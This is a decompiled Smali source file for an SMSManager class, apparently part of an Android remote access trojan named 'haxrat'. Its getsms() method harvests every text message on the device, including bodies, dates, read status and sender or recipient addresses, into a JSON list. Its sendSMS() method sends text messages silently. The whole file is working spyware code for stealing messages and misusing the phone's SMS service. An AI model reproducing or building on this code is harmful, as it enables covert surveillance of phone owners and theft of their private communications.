.class public Lcom/hax4us/haxrat/SMSManager;
.super Ljava/lang/Object;
.source "SMSManager.java"


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 83
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static getsms()Lorg/json/JSONObject;
    .locals 19

    .prologue
    .line 15
    const/4 v12, 0x0

    check-cast v12, Lorg/json/JSONObject;

    move-object v1, v12

    .line 16
    const/4 v12, 0x0

    check-cast v12, Lorg/json/JSONArray;

    move-object v2, v12

    .line 20
    :try_start_0
    new-instance v12, Lorg/json/JSONArray;

    move-object/from16 v18, v12

    move-object/from16 v12, v18

    move-object/from16 v13, v18

    invoke-direct {v13}, Lorg/json/JSONArray;-><init>()V

    move-object v2, v12

    .line 22
    new-instance v12, Lorg/json/JSONObject;

    move-object/from16 v18, v12

    move-object/from16 v12, v18

    move-object/from16 v13, v18

    invoke-direct {v13}, Lorg/json/JSONObject;-><init>()V

    move-object v1, v12

    .line 23
    const-string v12, "content://sms/"

    invoke-static {v12}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v12

    move-object v3, v12

    .line 24
    invoke-static {}, Lcom/hax4us/haxrat/MainService;->getContextOfApplication()Landroid/content/Context;

    move-result-object v12

    move-object v4, v12

    .line 25
    move-object v12, v4

    invoke-virtual {v12}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v12

    move-object v13, v3

    const/4 v14, 0x0

    check-cast v14, [Ljava/lang/String;

    const/4 v15, 0x0

    check-cast v15, Ljava/lang/String;

    const/16 v16, 0x0

    check-cast v16, [Ljava/lang/String;

    const/16 v17, 0x0

    check-cast v17, Ljava/lang/String;

    invoke-virtual/range {v12 .. v17}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v12

    move-object v5, v12

    .line 28
    move-object v12, v5

    invoke-interface {v12}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v12

    if-eqz v12, :cond_0

    .line 30
    const/4 v12, 0x0

    move v6, v12

    :goto_0
    move v12, v6

    move-object v13, v5

    invoke-interface {v13}, Landroid/database/Cursor;->getCount()I

    move-result v13

    if-lt v12, v13, :cond_1

    .line 59
    :cond_0
    move-object v12, v5

    invoke-interface {v12}, Landroid/database/Cursor;->close()V

    .line 61
    move-object v12, v1

    const-string v13, "smslist"

    move-object v14, v2

    invoke-virtual {v12, v13, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v12

    .line 70
    :goto_1
    move-object v12, v1

    move-object v0, v12

    return-object v0

    .line 32
    :cond_1
    move-object v12, v1

    const-string v13, "body"

    move-object v14, v5

    move-object v15, v5

    const-string v16, "body"

    invoke-interface/range {v15 .. v16}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v15

    invoke-interface {v14, v15}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v14}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v12, v13, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v12

    .line 34
    move-object v12, v1

    const-string v13, "date"

    move-object v14, v5

    move-object v15, v5

    const-string v16, "date"

    invoke-interface/range {v15 .. v16}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v15

    invoke-interface {v14, v15}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v14}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v12, v13, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v12

    .line 35
    move-object v12, v1

    const-string v13, "read"

    move-object v14, v5

    move-object v15, v5

    const-string v16, "read"

    invoke-interface/range {v15 .. v16}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v15

    invoke-interface {v14, v15}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v14}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v12, v13, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v12

    .line 36
    move-object v12, v1

    const-string v13, "type"

    move-object v14, v5

    move-object v15, v5

    const-string v16, "type"

    invoke-interface/range {v15 .. v16}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v15

    invoke-interface {v14, v15}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v14}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v12, v13, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v12

    .line 37
    move-object v12, v5

    move-object v13, v5

    const-string v14, "type"

    invoke-interface {v13, v14}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v13

    invoke-interface {v12, v13}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v12

    const-string v13, "3"

    invoke-virtual {v12, v13}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_3

    .line 38
    move-object v12, v5

    move-object v13, v5

    const-string v14, "thread_id"

    invoke-interface {v13, v14}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v13

    invoke-interface {v12, v13}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v12

    move-object v7, v12

    .line 39
    move-object v12, v4

    invoke-virtual {v12}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v12

    const-string v13, "content://mms-sms/conversations?simple=true"

    invoke-static {v13}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v13

    const/4 v14, 0x0

    check-cast v14, [Ljava/lang/String;

    new-instance v15, Ljava/lang/StringBuffer;

    move-object/from16 v18, v15

    move-object/from16 v15, v18

    move-object/from16 v16, v18

    invoke-direct/range {v16 .. v16}, Ljava/lang/StringBuffer;-><init>()V

    const-string v16, "_id ="

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v15

    move-object/from16 v16, v7

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v15

    invoke-virtual {v15}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v15

    const/16 v16, 0x0

    check-cast v16, [Ljava/lang/String;

    const/16 v17, 0x0

    check-cast v17, Ljava/lang/String;

    invoke-virtual/range {v12 .. v17}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v12

    move-object v8, v12

    .line 40
    move-object v12, v8

    invoke-interface {v12}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v12

    if-eqz v12, :cond_2

    .line 41
    move-object v12, v8

    move-object v13, v8

    const-string v14, "recipient_ids"

    invoke-interface {v13, v14}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v13

    invoke-interface {v12, v13}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v12

    move-object v9, v12

    .line 42
    move-object v12, v4

    invoke-virtual {v12}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v12

    const-string v13, "content://mms-sms/canonical-addresses"

    invoke-static {v13}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v13

    const/4 v14, 0x0

    check-cast v14, [Ljava/lang/String;

    new-instance v15, Ljava/lang/StringBuffer;

    move-object/from16 v18, v15

    move-object/from16 v15, v18

    move-object/from16 v16, v18

    invoke-direct/range {v16 .. v16}, Ljava/lang/StringBuffer;-><init>()V

    const-string v16, "_id = "

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v15

    move-object/from16 v16, v9

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v15

    invoke-virtual {v15}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v15

    const/16 v16, 0x0

    check-cast v16, [Ljava/lang/String;

    const/16 v17, 0x0

    check-cast v17, Ljava/lang/String;

    invoke-virtual/range {v12 .. v17}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v12

    move-object v8, v12

    .line 43
    move-object v12, v8

    invoke-interface {v12}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v12

    if-eqz v12, :cond_2

    .line 44
    move-object v12, v8

    move-object v13, v8

    const-string v14, "address"

    invoke-interface {v13, v14}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v13

    invoke-interface {v12, v13}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v12

    move-object v10, v12

    .line 45
    move-object v12, v1

    const-string v13, "address"

    move-object v14, v10

    invoke-virtual {v12, v13, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v12

    .line 46
    move-object v12, v8

    invoke-interface {v12}, Landroid/database/Cursor;->close()V

    .line 53
    :cond_2
    :goto_2
    move-object v12, v2

    move-object v13, v1

    invoke-virtual {v12, v13}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    move-result-object v12

    .line 54
    new-instance v12, Lorg/json/JSONObject;

    move-object/from16 v18, v12

    move-object/from16 v12, v18

    move-object/from16 v13, v18

    invoke-direct {v13}, Lorg/json/JSONObject;-><init>()V

    move-object v1, v12

    .line 56
    move-object v12, v5

    invoke-interface {v12}, Landroid/database/Cursor;->moveToNext()Z

    move-result v12

    .line 30
    add-int/lit8 v6, v6, 0x1

    goto/16 :goto_0

    .line 51
    :cond_3
    move-object v12, v1

    const-string v13, "address"

    move-object v14, v5

    move-object v15, v5

    const-string v16, "address"

    invoke-interface/range {v15 .. v16}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v15

    invoke-interface {v14, v15}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v14}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v12, v13, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_0
    .catch Ljava/lang/IllegalArgumentException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_1

    move-result-object v12

    goto :goto_2

    .line 61
    :catch_0
    move-exception v12

    move-object v3, v12

    .line 65
    move-object v12, v3

    invoke-virtual {v12}, Ljava/lang/IllegalArgumentException;->printStackTrace()V

    goto/16 :goto_1

    :catch_1
    move-exception v12

    move-object v3, v12

    .line 68
    move-object v12, v3

    invoke-virtual {v12}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_1
.end method

.method public static sendSMS(Ljava/lang/String;Ljava/lang/String;)Z
    .locals 11

    .prologue
    .line 75
    move-object v0, p0

    move-object v1, p1

    :try_start_0
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v5

    move-object v3, v5

    .line 76
    move-object v5, v3

    move-object v6, v0

    const/4 v7, 0x0

    check-cast v7, Ljava/lang/String;

    move-object v8, v1

    const/4 v9, 0x0

    check-cast v9, Landroid/app/PendingIntent;

    const/4 v10, 0x0

    check-cast v10, Landroid/app/PendingIntent;

    invoke-virtual/range {v5 .. v10}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 77
    const/4 v5, 0x1

    move v0, v5

    .line 80
    :goto_0
    return v0

    .line 77
    :catch_0
    move-exception v5

    move-object v3, v5

    .line 79
    move-object v5, v3

    invoke-virtual {v5}, Ljava/lang/Exception;->printStackTrace()V

    .line 80
    const/4 v5, 0x0

    move v0, v5

    goto :goto_0
.end method
